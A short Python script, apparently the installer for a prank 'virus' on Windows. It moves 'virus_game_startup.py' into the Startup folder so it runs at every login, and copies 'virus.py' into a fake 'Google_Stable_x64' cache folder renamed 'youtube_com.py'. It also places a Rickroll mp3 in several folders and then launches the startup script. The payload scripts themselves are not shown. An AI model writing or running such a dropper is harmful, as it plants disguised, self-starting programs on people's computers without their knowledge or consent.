import os

home_dir = "%USERPROFILE%"
startup_folder = f"{home_dir}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

# Create the directories
os.system(f"mkdir {home_dir}/Downloads/Google_Stable_x64/assets/cache/")

# Move everything to the place
os.system(f"move virus_game_startup.py {startup_folder}")

os.system(f"copy youtube_com-watch-dQw4w9WgXcQ.mp3 %USERPROFILE%/Music/youtube_com-watch-dQw4w9WgXcQ.mp3")
os.system(f"copy youtube_com-watch-dQw4w9WgXcQ.mp3 %USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com-watch-dQw4w9WgXcQ.mp3")
os.system(f"copy virus.py %USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com.py")

os.system(f"python {startup_folder}/virus_game_startup.py")
